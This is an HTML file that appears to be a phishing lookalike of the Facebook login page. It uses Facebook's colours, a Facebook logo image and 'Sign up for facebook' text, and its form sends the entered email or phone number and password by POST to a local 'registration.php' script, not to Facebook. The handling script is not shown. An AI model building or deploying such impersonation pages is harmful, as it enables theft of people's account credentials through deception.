<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>

<style>

body {
  background-color: #3b5998;
  margin: 0;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh; /* Ensure the body covers the entire viewport */
}

.container {
  text-align: center;
  display: inline-block;
}

img {
  display: block;
  margin: auto;
  max-width: 80%;
}

.inputs {
  font-size: 18px;
  width: 90%; /* Make input full width on mobile */
  padding: 10px;
  border-radius: 3px;
  border: none;
}

.login {
  font-size: 20px;
  width: 96%;
  padding: 10px;
  margin: 10px;
  margin-bottom: 100px;
  background-color: #1877f2;
  font-family: inherit;
  color: white;
  font-weight: bold;
  border-radius: 6px;
}

.p1 {
  color: white;
  margin-top: 80px;
}

.p2 {
  color: white;
}
</style>

</head>
<body>

<div class="container">
  <img src="img/facebook.png" alt="broken image">
    <form action="registration.php" method="post">
     <input class="inputs" type="text" name="username" placeholder="email or phone number"><br>
     <input class="inputs" type="password" name="password" placeholder="password"><br>
     <input class="login" type="submit" value="Log In" name="login">
    </form>
<p class="p1">Sign up for facebook</p>
<p class="p2">Need help?</p>


</body>
</html>
